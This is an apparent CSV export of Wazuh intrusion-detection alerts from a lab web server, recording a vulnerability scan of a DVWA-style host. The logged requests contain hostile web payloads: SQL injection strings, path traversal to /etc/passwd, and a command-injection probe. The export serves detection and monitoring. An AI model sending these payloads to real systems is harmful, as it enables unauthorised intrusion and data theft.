_index,_id,_version,_score,_source.agent.ip,_source.agent.name,_source.agent.id,_source.manager.name,_source.data.protocol,_source.data.srcip,_source.data.id,_source.data.url,_source.rule.firedtimes,_source.rule.mail,_source.rule.level,_source.rule.pci_dss,_source.rule.tsc,_source.rule.description,_source.rule.groups,_source.rule.id,_source.rule.nist_800_53,_source.rule.gdpr,_source.decoder.name,_source.full_log,_source.input.type,_source.@timestamp,_source.location,_source.id,_source.timestamp,_source.rule.mitre.technique,_source.rule.mitre.id,_source.rule.mitre.tactic,_source.previous_output,_source.rule.frequency,_source.rule.info,_source.predecoder.hostname,_source.predecoder.program_name,_source.predecoder.timestamp,_source.data.dstuser,_source.data.srcport,_source.decoder.parent,_source.rule.hipaa
wazuh-alerts-4.x-2023.10.20,psBWTosBpjjGT_ibO8mv,1,1,192.168.40.130,machine-1,001,ubuntu,GET,192.168.204.1,404,/cgi-bin/pajax/pajax_call_dispatcher.php,6375,false,5,"[""6.5"",""11.4""]","[""CC6.6"",""CC7.1"",""CC8.1"",""CC6.1"",""CC6.8"",""CC7.2"",""CC7.3""]",Web server 400 error code.,"[""web"",""accesslog"",""attack""]",31101,"[""SA.11"",""SI.4""]","[""IV_35.7.d""]",web-accesslog,"192.168.204.1 - - [20/Oct/2023:23:25:47 +0500] ""GET /cgi-bin/pajax/pajax_call_dispatcher.php HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""",log,"Oct 20, 2023 @ 18:25:48.622",/var/log/apache2/access.log,1697826348.6262069,"Oct 20, 2023 @ 18:25:48.622", , , , , , , , , , , , , 
wazuh-alerts-4.x-2023.10.20,rcBWTosBpjjGT_ibO8mv,1,1,192.168.40.130,machine-1,001,ubuntu,GET,192.168.204.1,404,"/DVWA/admin/index.php?act=login&username='%20UNION%20SELECT%201,'pafaq_10b4.nasl','5e0bd03bec244039678f2b955a2595aa','',0,'',''--&password=nessus",62,false,7,"[""6.5"",""11.4"",""6.5.1""]","[""CC6.6"",""CC7.1"",""CC8.1"",""CC6.1"",""CC6.8"",""CC7.2"",""CC7.3""]",SQL injection attempt.,"[""web"",""accesslog"",""attack"",""sql_injection""]",31103,"[""SA.11"",""SI.4""]","[""IV_35.7.d""]",web-accesslog,"192.168.204.1 - - [20/Oct/2023:23:25:47 +0500] ""GET /DVWA/admin/index.php?act=login&username='%20UNION%20SELECT%201,'pafaq_10b4.nasl','5e0bd03bec244039678f2b955a2595aa','',0,'',''--&password=nessus HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""",log,"Oct 20, 2023 @ 18:25:48.626",/var/log/apache2/access.log,1697826348.6267901,"Oct 20, 2023 @ 18:25:48.626","[""Exploit Public-Facing Application""]","[""T1190""]","[""Initial Access""]", , , , , , , , , , 
wazuh-alerts-4.x-2023.10.20,tsBWTosBpjjGT_ibO8mv,1,1,192.168.40.130,machine-1,001,ubuntu,GET,192.168.204.1,404,/cgi-bin/lib/OWL_API.php?xrms_file_root=../../../../../../../../../../../../etc/passwd%00,652,false,6,"[""6.5"",""11.4"",""6.5.1""]","[""CC6.6"",""CC7.1"",""CC8.1"",""CC6.1"",""CC6.8"",""CC7.2"",""CC7.3""]",Common web attack.,"[""web"",""accesslog"",""attack""]",31104,"[""SA.11"",""SI.4""]","[""IV_35.7.d""]",web-accesslog,"192.168.204.1 - - [20/Oct/2023:23:25:47 +0500] ""GET /cgi-bin/lib/OWL_API.php?xrms_file_root=../../../../../../../../../../../../etc/passwd%00 HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""",log,"Oct 20, 2023 @ 18:25:48.630",/var/log/apache2/access.log,1697826348.6272849,"Oct 20, 2023 @ 18:25:48.630","[""Process Injection"",""File and Directory Discovery"",""Exploit Public-Facing Application""]","[""T1055"",""T1083"",""T1190""]","[""Defense Evasion"",""Privilege Escalation"",""Discovery"",""Initial Access""]", , , , , , , , , , 
wazuh-alerts-4.x-2023.10.20,uMBWTosBpjjGT_ibO8mv,1,1,192.168.40.130,machine-1,001,ubuntu,GET,192.168.204.1,404,/browse.php,6385,false,5,"[""6.5"",""11.4""]","[""CC6.6"",""CC7.1"",""CC8.1"",""CC6.1"",""CC6.8"",""CC7.2"",""CC7.3""]",Web server 400 error code.,"[""web"",""accesslog"",""attack""]",31101,"[""SA.11"",""SI.4""]","[""IV_35.7.d""]",web-accesslog,"192.168.204.1 - - [20/Oct/2023:23:25:47 +0500] ""GET /browse.php HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""",log,"Oct 20, 2023 @ 18:25:48.631",/var/log/apache2/access.log,1697826348.6274003,"Oct 20, 2023 @ 18:25:48.631", , , , , , , , , , , , , 
wazuh-alerts-4.x-2023.10.20,u8BWTosBpjjGT_ibPMkE,1,1,192.168.40.130,machine-1,001,ubuntu,GET,192.168.204.1,404,/lib/OWL_API.php?xrms_file_root=../../../../../../../../../../../../etc/passwd%00,654,false,6,"[""6.5"",""11.4"",""6.5.1""]","[""CC6.6"",""CC7.1"",""CC8.1"",""CC6.1"",""CC6.8"",""CC7.2"",""CC7.3""]",Common web attack.,"[""web"",""accesslog"",""attack""]",31104,"[""SA.11"",""SI.4""]","[""IV_35.7.d""]",web-accesslog,"192.168.204.1 - - [20/Oct/2023:23:25:47 +0500] ""GET /lib/OWL_API.php?xrms_file_root=../../../../../../../../../../../../etc/passwd%00 HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""",log,"Oct 20, 2023 @ 18:25:48.633",/var/log/apache2/access.log,1697826348.6277652,"Oct 20, 2023 @ 18:25:48.633","[""Process Injection"",""File and Directory Discovery"",""Exploit Public-Facing Application""]","[""T1055"",""T1083"",""T1190""]","[""Defense Evasion"",""Privilege Escalation"",""Discovery"",""Initial Access""]", , , , , , , , , , 
wazuh-alerts-4.x-2023.10.20,vMBWTosBpjjGT_ibPMkE,1,1,192.168.40.130,machine-1,001,ubuntu,GET,192.168.204.1,404,/owl/index.php,6387,false,5,"[""6.5"",""11.4""]","[""CC6.6"",""CC7.1"",""CC8.1"",""CC6.1"",""CC6.8"",""CC7.2"",""CC7.3""]",Web server 400 error code.,"[""web"",""accesslog"",""attack""]",31101,"[""SA.11"",""SI.4""]","[""IV_35.7.d""]",web-accesslog,"192.168.204.1 - - [20/Oct/2023:23:25:47 +0500] ""GET /owl/index.php HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""",log,"Oct 20, 2023 @ 18:25:48.634",/var/log/apache2/access.log,1697826348.6278221,"Oct 20, 2023 @ 18:25:48.634", , , , , , , , , , , , , 
wazuh-alerts-4.x-2023.10.20,vcBWTosBpjjGT_ibPMkE,1,1,192.168.40.130,machine-1,001,ubuntu,GET,192.168.204.1,404,/intranet/index.php,6388,false,5,"[""6.5"",""11.4""]","[""CC6.6"",""CC7.1"",""CC8.1"",""CC6.1"",""CC6.8"",""CC7.2"",""CC7.3""]",Web server 400 error code.,"[""web"",""accesslog"",""attack""]",31101,"[""SA.11"",""SI.4""]","[""IV_35.7.d""]",web-accesslog,"192.168.204.1 - - [20/Oct/2023:23:25:47 +0500] ""GET /intranet/index.php HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""",log,"Oct 20, 2023 @ 18:25:48.634",/var/log/apache2/access.log,1697826348.6278717,"Oct 20, 2023 @ 18:25:48.634", , , , , , , , , , , , , 
wazuh-alerts-4.x-2023.10.20,w8BWTosBpjjGT_ibPMkE,1,1,192.168.40.130,machine-1,001,ubuntu,GET,192.168.204.1,404,/scripts/login.php?lang=/../../../../../../../../../../../../etc/passwd%00,655,false,6,"[""6.5"",""11.4"",""6.5.1""]","[""CC6.6"",""CC7.1"",""CC8.1"",""CC6.1"",""CC6.8"",""CC7.2"",""CC7.3""]",Common web attack.,"[""web"",""accesslog"",""attack""]",31104,"[""SA.11"",""SI.4""]","[""IV_35.7.d""]",web-accesslog,"192.168.204.1 - - [20/Oct/2023:23:25:47 +0500] ""GET /scripts/login.php?lang=/../../../../../../../../../../../../etc/passwd%00 HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""",log,"Oct 20, 2023 @ 18:25:48.636",/var/log/apache2/access.log,1697826348.6283504,"Oct 20, 2023 @ 18:25:48.636","[""Process Injection"",""File and Directory Discovery"",""Exploit Public-Facing Application""]","[""T1055"",""T1083"",""T1190""]","[""Defense Evasion"",""Privilege Escalation"",""Discovery"",""Initial Access""]", , , , , , , , , , 
wazuh-alerts-4.x-2023.10.20,xMBWTosBpjjGT_ibPMkE,1,1,192.168.40.130,machine-1,001,ubuntu,GET,192.168.204.1,404,/index.php,6393,false,5,"[""6.5"",""11.4""]","[""CC6.6"",""CC7.1"",""CC8.1"",""CC6.1"",""CC6.8"",""CC7.2"",""CC7.3""]",Web server 400 error code.,"[""web"",""accesslog"",""attack""]",31101,"[""SA.11"",""SI.4""]","[""IV_35.7.d""]",web-accesslog,"192.168.204.1 - - [20/Oct/2023:23:25:47 +0500] ""GET /index.php HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""",log,"Oct 20, 2023 @ 18:25:48.638",/var/log/apache2/access.log,1697826348.6284066,"Oct 20, 2023 @ 18:25:48.638", , , , , , , , , , , , , 
wazuh-alerts-4.x-2023.10.20,xcBWTosBpjjGT_ibPMkE,1,1,192.168.40.130,machine-1,001,ubuntu,GET,192.168.204.1,404,/DVWA/customer.pl,6394,false,5,"[""6.5"",""11.4""]","[""CC6.6"",""CC7.1"",""CC8.1"",""CC6.1"",""CC6.8"",""CC7.2"",""CC7.3""]",Web server 400 error code.,"[""web"",""accesslog"",""attack""]",31101,"[""SA.11"",""SI.4""]","[""IV_35.7.d""]",web-accesslog,"192.168.204.1 - - [20/Oct/2023:23:25:47 +0500] ""GET /DVWA/customer.pl HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""",log,"Oct 20, 2023 @ 18:25:48.637",/var/log/apache2/access.log,1697826348.6284558,"Oct 20, 2023 @ 18:25:48.637", , , , , , , , , , , , , 
wazuh-alerts-4.x-2023.10.20,zcBWTosBpjjGT_ibPMkE,1,1,192.168.40.130,machine-1,001,ubuntu,GET,192.168.204.1,404,/cgi-bin/inc/exif.inc.php?exif_prog=(echo%20-n%20'original_exif_prog_cmd_exec.nasl%3a%20'%3bid)%7c%7cecho,6402,false,5,"[""6.5"",""11.4""]","[""CC6.6"",""CC7.1"",""CC8.1"",""CC6.1"",""CC6.8"",""CC7.2"",""CC7.3""]",Web server 400 error code.,"[""web"",""accesslog"",""attack""]",31101,"[""SA.11"",""SI.4""]","[""IV_35.7.d""]",web-accesslog,"192.168.204.1 - - [20/Oct/2023:23:25:47 +0500] ""GET /cgi-bin/inc/exif.inc.php?exif_prog=(echo%20-n%20'original_exif_prog_cmd_exec.nasl%3a%20'%3bid)%7c%7cecho HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""",log,"Oct 20, 2023 @ 18:25:48.642",/var/log/apache2/access.log,1697826348.6288761,"Oct 20, 2023 @ 18:25:48.642", , , , , , , , , , , , , 
wazuh-alerts-4.x-2023.10.20,3MBWTosBpjjGT_ibPMkE,1,1,192.168.40.130,machine-1,001,ubuntu,GET,192.168.204.1,404,/config/oramon.ini,493,false,10,"[""6.5"",""11.4""]","[""CC6.6"",""CC7.1"",""CC8.1"",""CC6.1"",""CC6.8"",""CC7.2"",""CC7.3""]",Multiple web server 400 error codes from same source ip.,"[""web"",""accesslog"",""web_scan"",""recon""]",31151,"[""SA.11"",""SI.4""]","[""IV_35.7.d""]",web-accesslog,"192.168.204.1 - - [20/Oct/2023:23:25:48 +0500] ""GET /config/oramon.ini HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""",log,"Oct 20, 2023 @ 18:25:48.649",/var/log/apache2/access.log,1697826348.6298756,"Oct 20, 2023 @ 18:25:48.649","[""Vulnerability Scanning""]","[""T1595.002""]","[""Reconnaissance""]","192.168.204.1 - - [20/Oct/2023:23:25:48 +0500] ""GET /scripts/login.php HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""
192.168.204.1 - - [20/Oct/2023:23:25:48 +0500] ""GET /DVWA/config/oramon.ini HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""
192.168.204.1 - - [20/Oct/2023:23:25:47 +0500] ""GET /inc/exif.inc.php?exif_prog=(echo%20-n%20'original_exif_prog_cmd_exec.nasl%3a%20'%3bid)%7c%7cecho HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""
192.168.204.1 - - [20/Oct/2023:23:25:48 +0500] ""GET /cgi-bin/login.php HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""
192.168.204.1 - - [20/Oct/2023:23:25:48 +0500] ""GET /scripts/config/oramon.ini HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""
192.168.204.1 - - [20/Oct/2023:23:25:48 +0500] ""GET /cgi-bin/config/oramon.ini HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""
192.168.204.1 - - [20/Oct/2023:23:25:47 +0500] ""GET /oramon/config/oramon.ini HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""
192.168.204.1 - - [20/Oct/2023:23:25:48 +0500] ""GET /orangehrm/login.php HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""
192.168.204.1 - - [20/Oct/2023:23:25:47 +0500] ""GET /orangehrm2/login.php HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""
192.168.204.1 - - [20/Oct/2023:23:25:47 +0500] ""GET /lang/index.php?file=/etc/passwd HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""
192.168.204.1 - - [20/Oct/2023:23:25:47 +0500] ""GET /DVWA/lang/index.php?file=/etc/passwd HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""",14, , , , , , , , 
wazuh-alerts-4.x-2023.10.20,4sBWTosBpjjGT_ibPMkE,1,1,192.168.40.130,machine-1,001,ubuntu,GET,192.168.204.1,404,/ads/www/delivery/fc.php?MAX_type=../../../../../../../../../../etc/passwd%00,658,false,6,"[""6.5"",""11.4"",""6.5.1""]","[""CC6.6"",""CC7.1"",""CC8.1"",""CC6.1"",""CC6.8"",""CC7.2"",""CC7.3""]",Common web attack.,"[""web"",""accesslog"",""attack""]",31104,"[""SA.11"",""SI.4""]","[""IV_35.7.d""]",web-accesslog,"192.168.204.1 - - [20/Oct/2023:23:25:48 +0500] ""GET /ads/www/delivery/fc.php?MAX_type=../../../../../../../../../../etc/passwd%00 HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""",log,"Oct 20, 2023 @ 18:25:48.653",/var/log/apache2/access.log,1697826348.6304013,"Oct 20, 2023 @ 18:25:48.653","[""Process Injection"",""File and Directory Discovery"",""Exploit Public-Facing Application""]","[""T1055"",""T1083"",""T1190""]","[""Defense Evasion"",""Privilege Escalation"",""Discovery"",""Initial Access""]", , , , , , , , , , 
wazuh-alerts-4.x-2023.10.20,6cBWTosBpjjGT_ibPMkE,1,1,192.168.40.130,machine-1,001,ubuntu,GET,192.168.204.1,404,/cgi-bin/www/delivery/fc.php?MAX_type=../../../../../../../../../../etc/passwd%00,661,false,6,"[""6.5"",""11.4"",""6.5.1""]","[""CC6.6"",""CC7.1"",""CC8.1"",""CC6.1"",""CC6.8"",""CC7.2"",""CC7.3""]",Common web attack.,"[""web"",""accesslog"",""attack""]",31104,"[""SA.11"",""SI.4""]","[""IV_35.7.d""]",web-accesslog,"192.168.204.1 - - [20/Oct/2023:23:25:48 +0500] ""GET /cgi-bin/www/delivery/fc.php?MAX_type=../../../../../../../../../../etc/passwd%00 HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""",log,"Oct 20, 2023 @ 18:25:48.655",/var/log/apache2/access.log,1697826348.6307801,"Oct 20, 2023 @ 18:25:48.655","[""Process Injection"",""File and Directory Discovery"",""Exploit Public-Facing Application""]","[""T1055"",""T1083"",""T1190""]","[""Defense Evasion"",""Privilege Escalation"",""Discovery"",""Initial Access""]", , , , , , , , , , 
wazuh-alerts-4.x-2023.10.20,6sBWTosBpjjGT_ibPMkE,1,1,192.168.40.130,machine-1,001,ubuntu,GET,192.168.204.1,404,/DVWA/pajax/pajax_call_dispatcher.php,6422,false,5,"[""6.5"",""11.4""]","[""CC6.6"",""CC7.1"",""CC8.1"",""CC6.1"",""CC6.8"",""CC7.2"",""CC7.3""]",Web server 400 error code.,"[""web"",""accesslog"",""attack""]",31101,"[""SA.11"",""SI.4""]","[""IV_35.7.d""]",web-accesslog,"192.168.204.1 - - [20/Oct/2023:23:25:47 +0500] ""GET /DVWA/pajax/pajax_call_dispatcher.php HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""",log,"Oct 20, 2023 @ 18:25:48.656",/var/log/apache2/access.log,1697826348.6308370,"Oct 20, 2023 @ 18:25:48.656", , , , , , , , , , , , , 
wazuh-alerts-4.x-2023.10.20,7cBWTosBpjjGT_ibPMls,1,1,192.168.40.130,machine-1,001,ubuntu,GET,192.168.204.1,404,/scripts/www/delivery/ac.php?bannerid=-87+OR+1=1,6424,false,5,"[""6.5"",""11.4""]","[""CC6.6"",""CC7.1"",""CC8.1"",""CC6.1"",""CC6.8"",""CC7.2"",""CC7.3""]",Web server 400 error code.,"[""web"",""accesslog"",""attack""]",31101,"[""SA.11"",""SI.4""]","[""IV_35.7.d""]",web-accesslog,"192.168.204.1 - - [20/Oct/2023:23:25:48 +0500] ""GET /scripts/www/delivery/ac.php?bannerid=-87+OR+1=1 HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""",log,"Oct 20, 2023 @ 18:25:48.657",/var/log/apache2/access.log,1697826348.6309982,"Oct 20, 2023 @ 18:25:48.657", , , , , , , , , , , , , 
wazuh-alerts-4.x-2023.10.20,7sBWTosBpjjGT_ibPMls,1,1,192.168.40.130,machine-1,001,ubuntu,GET,192.168.204.1,404,/OvCgi/ovlaunch.exe,6425,false,5,"[""6.5"",""11.4""]","[""CC6.6"",""CC7.1"",""CC8.1"",""CC6.1"",""CC6.8"",""CC7.2"",""CC7.3""]",Web server 400 error code.,"[""web"",""accesslog"",""attack""]",31101,"[""SA.11"",""SI.4""]","[""IV_35.7.d""]",web-accesslog,"192.168.204.1 - - [20/Oct/2023:23:25:48 +0500] ""GET /OvCgi/ovlaunch.exe HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""",log,"Oct 20, 2023 @ 18:25:48.658",/var/log/apache2/access.log,1697826348.6310512,"Oct 20, 2023 @ 18:25:48.658", , , , , , , , , , , , , 
wazuh-alerts-4.x-2023.10.20,8cBWTosBpjjGT_ibPMls,1,1,192.168.40.130,machine-1,001,ubuntu,GET,192.168.204.1,404,/DVWA/www/delivery/fc.php?MAX_type=../../../../../../../../../../etc/passwd%00,73,false,10,"[""6.5"",""11.4""]","[""CC6.6"",""CC7.1"",""CC8.1"",""CC6.1"",""CC6.8"",""CC7.2"",""CC7.3""]",Multiple common web attacks from same source ip.,"[""web"",""accesslog"",""attack""]",31153,"[""SA.11"",""SI.4""]","[""IV_35.7.d""]",web-accesslog,"192.168.204.1 - - [20/Oct/2023:23:25:48 +0500] ""GET /DVWA/www/delivery/fc.php?MAX_type=../../../../../../../../../../etc/passwd%00 HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""",log,"Oct 20, 2023 @ 18:25:48.660",/var/log/apache2/access.log,1697826348.6312063,"Oct 20, 2023 @ 18:25:48.660","[""Process Injection"",""File and Directory Discovery""]","[""T1055"",""T1083""]","[""Defense Evasion"",""Privilege Escalation"",""Discovery""]","192.168.204.1 - - [20/Oct/2023:23:25:48 +0500] ""GET /www/delivery/fc.php?MAX_type=../../../../../../../../../../etc/passwd%00 HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""
192.168.204.1 - - [20/Oct/2023:23:25:48 +0500] ""GET /cgi-bin/www/delivery/fc.php?MAX_type=../../../../../../../../../../etc/passwd%00 HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""
192.168.204.1 - - [20/Oct/2023:23:25:48 +0500] ""GET /scripts/www/delivery/fc.php?MAX_type=../../../../../../../../../../etc/passwd%00 HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""
192.168.204.1 - - [20/Oct/2023:23:25:48 +0500] ""GET /adserver/www/delivery/fc.php?MAX_type=../../../../../../../../../../etc/passwd%00 HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""
192.168.204.1 - - [20/Oct/2023:23:25:48 +0500] ""GET /ads/www/delivery/fc.php?MAX_type=../../../../../../../../../../etc/passwd%00 HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""
192.168.204.1 - - [20/Oct/2023:23:25:48 +0500] ""GET /openads/www/delivery/fc.php?MAX_type=../../../../../../../../../../etc/passwd%00 HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""
192.168.204.1 - - [20/Oct/2023:23:25:48 +0500] ""GET /openx/www/delivery/fc.php?MAX_type=../../../../../../../../../../etc/passwd%00 HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""
192.168.204.1 - - [20/Oct/2023:23:25:47 +0500] ""GET /scripts/login.php?lang=/../../../../../../../../../../../../etc/passwd%00 HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""
192.168.204.1 - - [20/Oct/2023:23:25:47 +0500] ""GET /lib/OWL_API.php?xrms_file_root=../../../../../../../../../../../../etc/passwd%00 HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""",10, , , , , , , , 
wazuh-alerts-4.x-2023.10.20,8sBWTosBpjjGT_ibPMls,1,1,192.168.40.130,machine-1,001,ubuntu,GET,192.168.204.1,404,/cgi-bin/ovlaunch.exe,6428,false,5,"[""6.5"",""11.4""]","[""CC6.6"",""CC7.1"",""CC8.1"",""CC6.1"",""CC6.8"",""CC7.2"",""CC7.3""]",Web server 400 error code.,"[""web"",""accesslog"",""attack""]",31101,"[""SA.11"",""SI.4""]","[""IV_35.7.d""]",web-accesslog,"192.168.204.1 - - [20/Oct/2023:23:25:48 +0500] ""GET /cgi-bin/ovlaunch.exe HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""",log,"Oct 20, 2023 @ 18:25:48.660",/var/log/apache2/access.log,1697826348.6314624,"Oct 20, 2023 @ 18:25:48.660", , , , , , , , , , , , , 
wazuh-alerts-4.x-2023.10.20,9sBWTosBpjjGT_ibPMls,1,1,192.168.40.130,machine-1,001,ubuntu,GET,192.168.204.1,404,/ovlaunch.exe,6431,false,5,"[""6.5"",""11.4""]","[""CC6.6"",""CC7.1"",""CC8.1"",""CC6.1"",""CC6.8"",""CC7.2"",""CC7.3""]",Web server 400 error code.,"[""web"",""accesslog"",""attack""]",31101,"[""SA.11"",""SI.4""]","[""IV_35.7.d""]",web-accesslog,"192.168.204.1 - - [20/Oct/2023:23:25:48 +0500] ""GET /ovlaunch.exe HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""",log,"Oct 20, 2023 @ 18:25:48.663",/var/log/apache2/access.log,1697826348.6318673,"Oct 20, 2023 @ 18:25:48.663", , , , , , , , , , , , , 
wazuh-alerts-4.x-2023.10.20,'-MBWTosBpjjGT_ibPMls,1,1,192.168.40.130,machine-1,001,ubuntu,GET,192.168.204.1,404,/OvCgi/OpenView5.exe,6433,false,5,"[""6.5"",""11.4""]","[""CC6.6"",""CC7.1"",""CC8.1"",""CC6.1"",""CC6.8"",""CC7.2"",""CC7.3""]",Web server 400 error code.,"[""web"",""accesslog"",""attack""]",31101,"[""SA.11"",""SI.4""]","[""IV_35.7.d""]",web-accesslog,"192.168.204.1 - - [20/Oct/2023:23:25:48 +0500] ""GET /OvCgi/OpenView5.exe HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""",log,"Oct 20, 2023 @ 18:25:48.664",/var/log/apache2/access.log,1697826348.6319738,"Oct 20, 2023 @ 18:25:48.664", , , , , , , , , , , , , 
wazuh-alerts-4.x-2023.10.20,'-cBWTosBpjjGT_ibPMls,1,1,192.168.40.130,machine-1,001,ubuntu,GET,192.168.204.1,404,/cgi-bin/www/delivery/ac.php?bannerid=-167+OR+1=1,6434,false,5,"[""6.5"",""11.4""]","[""CC6.6"",""CC7.1"",""CC8.1"",""CC6.1"",""CC6.8"",""CC7.2"",""CC7.3""]",Web server 400 error code.,"[""web"",""accesslog"",""attack""]",31101,"[""SA.11"",""SI.4""]","[""IV_35.7.d""]",web-accesslog,"192.168.204.1 - - [20/Oct/2023:23:25:48 +0500] ""GET /cgi-bin/www/delivery/ac.php?bannerid=-167+OR+1=1 HTTP/1.1"" 404 494 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)""",log,"Oct 20, 2023 @ 18:25:48.665",/var/log/apache2/access.log,1697826348.6320240,"Oct 20, 2023 @ 18:25:48.665", , , , , , , , , , , , , 
